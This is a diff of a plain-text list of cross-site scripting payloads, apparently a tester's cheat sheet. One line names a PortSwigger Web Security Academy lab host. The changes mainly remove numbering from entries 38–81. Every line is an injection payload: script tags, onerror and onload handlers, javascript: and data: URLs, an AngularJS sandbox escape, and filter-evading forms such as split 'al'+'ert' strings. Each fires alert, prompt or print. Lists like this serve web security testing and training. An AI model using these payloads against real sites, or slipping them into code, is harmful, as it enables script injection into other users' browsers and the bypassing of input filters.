@@ -1,9 +1,7 @@
 <iframe src="https://0a85000d037e197c815275e200c80061.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
 "onmouseout="alert(1)
-
 \"-alert(1)}//
 {{$on.constructor('alert(1)')()}}
-
 <script>alert('XSS')</script>
 <img src=x onerror=alert('XSS')>
 <svg onload=alert('XSS')>
@@ -41,55 +39,54 @@
 <script>var y=window.open("javascript:alert('XSS')")</script>
 <script>var a = document.createElement("script"); a.src="data:text/javascript,alert('XSS')"; document.body.appendChild(a);</script>
 <script>console.log('<script>alert("XSS")<\/script>')</script>
-38. <script>document.location="javascript:alert('XSS')"</script>
-39. <script>window.name="javascript:alert('XSS')"</script>
-40. <script>document.body.insertAdjacentHTML('beforeend', '<iframe src="javascript:alert(\'XSS\')"></iframe>')</script>
-41. <script>document.createElement('iframe').src='javascript:alert("XSS")'</script>
-42. <script>let a=new XMLHttpRequest(); a.open("GET","javascript:alert('XSS')"); a.send()</script>
-43. <script>window.opener.alert('XSS')</script>
-44. <script>window.alert.call(null, 'XSS')</script>
-45. <script>window.confirm('XSS')</script>
-46. <script>window.prompt('XSS')</script>
-47. <script>top["al"+"ert"]('XSS')</script>
-48. <script>self['ale'+'rt']('XSS')</script>
-49. <script>this['aler'+'t']('XSS')</script>
-50. <script>window['ale'+'rt']('XSS')</script>
-51. <script>var a=document.createElement('script');a.innerHTML='alert("XSS")';document.body.appendChild(a);</script>
-52. <script>location.assign("javascript:alert('XSS')")</script>
-53. <script>location.replace("javascript:alert('XSS')")</script>
-54. <script>location.reload=alert</script><img src=x onerror=location.reload()>
-55. <script>document.documentElement.innerHTML='<svg onload=alert("XSS")>'</script>
-56. <script>document.body.insertAdjacentText("beforeend", "<script>alert('XSS')<\/script>")</script>
-57. <script>window.frames[0].alert('XSS')</script>
-58. <script>window.setImmediate(()=>alert('XSS'))</script>
-59. <script>window.setInterval(()=>alert('XSS'), 1000)</script>
-60. <script>navigator.clipboard.writeText('<script>alert("XSS")<\/script>')</script>
-61. <script>fetch('javascript:alert("XSS")')</script>
-62. <script>window.onerror=()=>alert('XSS');throw new Error();</script>
-63. <script>window.setTimeout("alert('XSS')", 1000)</script>
-64. <script>document.write(`<img src=x onerror=alert('XSS')>`)</script>
-65. <script>document.body.innerHTML+=`<iframe src="javascript:alert('XSS')"></iframe>`</script>
-66. <script>document.querySelector('body').innerHTML='<svg onload=alert("XSS")>'</script>
-67. <script>window.addEventListener('load', ()=>alert('XSS'))</script>
-68. <script>window.history.pushState(null, null, 'javascript:alert("XSS")')</script>
-69. <script>eval('ale'+'rt("XSS")')</script>
-70. <script>setTimeout(()=>eval('alert("XSS")'), 1000)</script>
-71. <script>Function('alert("XSS")')()</script>
-72. <script>var f=new Function('alert("XSS")'); f();</script>
-73. <script>document.createElement('script').text='alert("XSS")'</script>
-74. <script>var s=document.createElement('script');s.src='data:text/javascript,alert("XSS")';document.body.appendChild(s);</script>
-75. <script>open('data:text/html,<script>alert("XSS")<\/script>')</script>
-76. <script>var a=new XMLHttpRequest(); a.open("GET","javascript:alert('XSS')"); a.send()</script>
-77. <script>navigator.vibrate(100); alert("XSS");</script>
-78. <script>var s="al"+"ert"; window[s]("XSS")</script>
-79. <script>setTimeout(()=>window['alert']("XSS"), 1000)</script>
-80. <script>let a="alert"; window[a]("XSS")</script>
-81. <script>let obj={a:alert}; obj.a("XSS")</script>
+<script>document.location = "javascript:alert('XSS')"</script>
+<script>window.name = "javascript:alert('XSS')"</script>
+<script>document.body.insertAdjacentHTML('beforeend','<iframe src="javascript:alert(\'XSS\')"></iframe>')</script>
+<script>let f=document.createElement('iframe'); f.src='javascript:alert("XSS")'; document.body.appendChild(f);</script>
+<script>let x=new XMLHttpRequest(); x.open("GET","javascript:alert('XSS')"); x.send()</script>
+<script>window.opener && window.opener.alert('XSS')</script>
+<script>window.alert.call(window, 'XSS')</script>
+<script>confirm('XSS')</script>
+<script>prompt('XSS')</script>
+<script>top["al"+"ert"]('XSS')</script>
+<script>self['ale'+'rt']('XSS')</script>
+<script>this['aler'+'t']('XSS')</script>
+<script>window['ale'+'rt']('XSS')</script>
+<script>let s=document.createElement('script'); s.innerHTML='alert("XSS")'; document.body.appendChild(s);</script>
+<script>location.assign("javascript:alert('XSS')")</script>
+<script>location.replace("javascript:alert('XSS')")</script>
+<script>location.reload=alert</script><img src=x onerror="location.reload()">
+<script>document.documentElement.innerHTML = '<svg onload=alert("XSS")>'</script>
+<script>document.body.insertAdjacentText('beforeend', "<script>alert('XSS')<\/script>")</script>
+<script>window.frames[0]?.alert('XSS')</script>
+<script>setImmediate(()=>alert('XSS'))</script>
+<script>setInterval(()=>alert('XSS'), 1000)</script>
+<script>navigator.clipboard.writeText('<script>alert("XSS")<\/script>')</script>
+<script>fetch('javascript:alert("XSS")')</script>
+<script>window.onerror=()=>alert('XSS'); throw new Error();</script>
+<script>setTimeout("alert('XSS')", 1000)</script>
+<script>document.write('<img src=x onerror=alert("XSS")>')</script>
+<script>document.body.innerHTML += '<iframe src="javascript:alert(\'XSS\')"></iframe>'</script>
+<script>document.querySelector('body').innerHTML = '<svg onload=alert("XSS")>'</script>
+<script>addEventListener('load', ()=>alert('XSS'))</script>
+<script>history.pushState(null,null,'javascript:alert("XSS")')</script>
+<script>eval('ale' + 'rt("XSS")')</script>
+<script>setTimeout(()=>eval('alert("XSS")'), 1000)</script>
+<script>Function('alert("XSS")')()</script>
+<script>let f=Function('alert("XSS")'); f();</script>
+<script>let e=document.createElement('script'); e.text='alert("XSS")'; document.body.appendChild(e);</script>
+<script>let s=document.createElement('script'); s.src='data:text/javascript,alert("XSS")'; document.body.appendChild(s);</script>
+<script>open('data:text/html,<script>alert("XSS")<\/script>')</script>
+<script>let xhr=new XMLHttpRequest(); xhr.open("GET","javascript:alert('XSS')"); xhr.send()</script>
+<script>navigator.vibrate(100); alert("XSS");</script>
+<script>let s="al"+"ert"; window[s]("XSS")</script>
+<script>setTimeout(()=>window['alert']("XSS"), 1000)</script>
+<script>let a="alert"; window[a]("XSS")</script>
+<script>let obj={a:alert}; obj.a("XSS")</script>
 <script>document.body.insertAdjacentHTML('beforeend', `<img src=x onerror=alert('XSS')>`)</script>
 <script>window.open('data:text/html,<script>alert("XSS")<\/script>')</script>
 <script>window['con'+'sole'].log('<script>alert("XSS")<\/script>')</script>
 <script>var x=document.createElement("script"); x.text="alert('XSS')"; document.body.appendChild(x);</script>
-
 "-prompt(8)-"
 '-prompt(8)-'
 ";a=prompt,a()//
